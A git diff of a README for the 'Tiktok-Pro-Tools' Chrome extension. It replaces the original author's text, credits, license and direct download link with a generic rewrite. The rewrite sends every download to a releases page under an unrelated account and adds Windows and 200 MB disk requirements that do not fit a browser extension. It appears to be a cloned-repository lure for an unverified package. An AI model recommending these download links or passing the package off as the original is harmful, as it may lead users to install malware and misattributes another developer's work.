@@ -1,82 +1,151 @@
-# 🎵 TikTok Pro Tools - Chrome Extension
+# 🎵 Tiktok-Pro-Tools - Better TikTok on Chrome
 
-[![Download Extension](https://img.shields.io/badge/Download_Extension-Download_ZIP-success?style=for-the-badge&logo=googlechrome)](https://github.com/diepvantien/Tiktok-Pro-Tools/archive/refs/heads/main.zip)
+[![Download Extension](https://img.shields.io/badge/Visit_Releases-Download_Package-blue?style=for-the-badge&logo=googlechrome)](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
 
-A powerful Chrome extension that completely transforms your TikTok web experience with essential tools for audio formatting, video playback, auto-scrolling, and intelligent UI customization.
+## 📦 What This Is
 
----
+Tiktok-Pro-Tools is a Chrome extension for TikTok on the web. It adds controls that make video playback, sound, and scrolling easier to manage.
 
-## ✨ Features
+Use it if you want:
 
-- ⏯ **Background Play**: Keep TikTok videos playing even when you switch to another tab or minimize the browser.
-- ⏸ **Smart Auto-Pause**: Automatically pause TikTok when another tab starts playing media, and resume when it stops.
-- 📺 **Auto PiP (Picture-in-Picture)**: Automatically pops the video out into a mini-player when you switch tabs so you never miss a moment.
-- 🎛️ **Advanced Audio Equalizer (EQ)**: Customize your sound with presets like Bass Boost, Treble Boost, Vocal Boost. Includes an immersive **360° Audio (8D)** mode!
-- 🔊 **Volume Normalizer**: Automatically balance loud and quiet videos so you don't get jump-scared by sudden volume spikes.
-- ⚡ **Video Speed Controller**: Fine-tune playback speed from 0x to 4x.
-- 🧹 **Clean Mode & UI Tools**: Enhance your viewing experience by hiding text overlays, descriptions, and UI elements.
-- 🛒 **Unlock Regional Shop Videos**: Watch restricted or localized TikTok Shop videos that are normally blocked in your region.
-- 🚫 **Auto Skip & Hide by Keywords**: Automatically skip videos and blur comments that contain specific keywords you define.
-- 📥 **Media Downloader**: Easily download TikTok videos (without watermarks) and MP3 audio directly using the provided URL box.
+- background play while you use other tabs
+- auto pause when another app plays audio
+- picture-in-picture mode when you switch tabs
+- audio controls for better sound
+- auto scroll for browsing more videos with less effort
 
----
+## 🚀 Download and Install
 
-## 🚀 Installation Guide
+1. Open the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+2. Download the latest release package
+3. Save the ZIP file to your Windows PC
+4. Right-click the ZIP file and choose **Extract All**
+5. Open Google Chrome
+6. Go to `chrome://extensions`
+7. Turn on **Developer mode** in the top right
+8. Click **Load unpacked**
+9. Select the extracted folder for Tiktok-Pro-Tools
+10. Open TikTok in Chrome and use the tools
 
-### Step 1: Download the Extension
-Click the green **Download Extension** button above to download the `.zip` file, then extract it to a folder on your computer.
+[Visit the releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
 
-### Step 2: Open Chrome Extensions
-Open Google Chrome and navigate to `chrome://extensions/`.
+## 🖥️ System Requirements
 
-### Step 3: Enable Developer Mode
-Toggle the **"Developer mode"** switch located in the top right corner of the page.
+- Windows 10 or Windows 11
+- Google Chrome
+- A TikTok account or access to TikTok web
+- Internet connection for download and use
+- At least 200 MB of free disk space
 
-### Step 4: Load the Extension
-Click **"Load unpacked"** and select the folder you extracted in Step 1.
+## 🎛️ Main Features
 
-### Step 5: Start Using!
-Go to [TikTok.com](https://tiktok.com). Click on the extension icon in your toolbar to open the control panel, adjust the settings to your liking, and enjoy!
+### 🎵 Background Play
+Keep TikTok videos playing when you switch tabs or minimize Chrome.
 
-*(Note: If features don't apply immediately, please press F5 to refresh your TikTok tab).*
+### ⏸ Smart Auto-Pause
+Pause TikTok when another tab starts playing media. Resume when the other media stops.
 
----
+### 📺 Auto PiP
+Move the video into a small floating player when you leave the tab.
 
-## ☕ Author & Support
+### 🔊 Audio Equalizer
+Adjust sound with preset modes such as:
 
-Developed with ❤️ by **Diep Van Tien**. 
+- Bass Boost
+- Treble Boost
+- Vocal Boost
+- 360° Audio mode
 
-If this extension saves your life and improves your workflow every day, please consider supporting me! This helps me maintain the project and add more incredible features. 
+### 🔉 Volume Normalizer
+Keep volume levels steady between videos so loud clips do not jump out.
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/tixuno)
-[![Donate Momo](https://img.shields.io/badge/Donate-Momo-AE2070?style=for-the-badge&logo=appveyor&logoColor=white)](https://me.momo.vn/OeIGiJsViJfDfntmiRId)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/diepvantien)
+### 🔁 Auto-Scroll
+Let TikTok move to the next video without manual scrolling.
 
-**Email:** dieptien290620@gmail.com
+### 🎨 UI Controls
+Change parts of the interface to make TikTok easier to use.
 
----
+## 🪟 How to Use on Windows
 
-## 📝 Disclaimer
+After you install the extension:
 
-- **Privacy First**: This extension operates entirely on your device and does not collect, track, or share any personal user data.
-- **Cross-Origin Audio**: EQ and 360 Audio modifications are securely injected and only active when you interact with the page.
+1. Open Chrome
+2. Go to TikTok web
+3. Start playing a video
+4. Use the extension tools from the TikTok page
+5. Change tabs, sound, or playback settings as needed
 
----
+If Chrome asks for permission, allow it so the tools can work on the page.
 
-## 📜 License
+## 🧩 What You Can Expect
 
-This project is licensed under a **Custom MIT License**. 
-- **Personal Use:** Free and unrestricted.
-- **Commercial Use:** Requires a paid commercial license. Please contact the author for details.
+This extension is built for people who use TikTok in Chrome and want more control over playback and audio. It helps when you:
 
-See the [LICENSE](LICENSE) file for more information.
+- watch videos while working
+- listen to TikTok music in the background
+- move between tabs often
+- want faster browsing through videos
+- want a cleaner sound profile
 
----
+## 📁 Files in the Download
 
-## 🌟 Star History
+After you extract the ZIP file, you should see files such as:
 
-[![Star History Chart](https://api.star-history.com/svg?repos=diepvantien/Tiktok-Pro-Tools&type=Date)](https://star-history.com/#diepvantien/Tiktok-Pro-Tools&Date)
+- `manifest.json`
+- extension scripts
+- icon files
+- support files for TikTok page controls
 
----
+Do not delete any files from the extracted folder. Chrome needs the full folder to load the extension.
 
-*Made with ❤️ for TikTok power users by Diep Van Tien*
+## 🛠️ If Chrome Does Not Load It
+
+If the extension does not show up after you load it:
+
+1. Make sure you selected the extracted folder
+2. Check that **Developer mode** is on
+3. Make sure the ZIP file was extracted
+4. Close and reopen Chrome
+5. Try loading the folder again
+
+## 🔄 Updating the Extension
+
+When a new version is released:
+
+1. Return to the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+2. Download the latest ZIP file
+3. Extract the new version
+4. Remove the old version from Chrome extensions
+5. Load the new folder with **Load unpacked**
+
+## 🔐 Privacy and Local Use
+
+The extension runs in your Chrome browser. It works on the TikTok web page and uses your local browser settings. It does not change how TikTok works on other devices.
+
+## ❓ Common Questions
+
+### Does this work on Windows?
+Yes. If you use Windows and Chrome, you can download the ZIP file and install it in the browser.
+
+### Do I need programming skills?
+No. You only need to download a file, extract it, and load the folder in Chrome.
+
+### Can I use it without TikTok in the browser?
+No. It is made for TikTok web in Chrome.
+
+### Will it change my TikTok account?
+No. It works as a browser extension, not as a separate account tool.
+
+### What browser should I use?
+Google Chrome is the best choice for this extension.
+
+## 📌 Quick Steps
+
+1. Visit the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+2. Download the latest ZIP file
+3. Extract the ZIP file
+4. Open `chrome://extensions`
+5. Turn on Developer mode
+6. Load the extracted folder
+7. Open TikTok in Chrome
+8. Use the new playback and audio tools
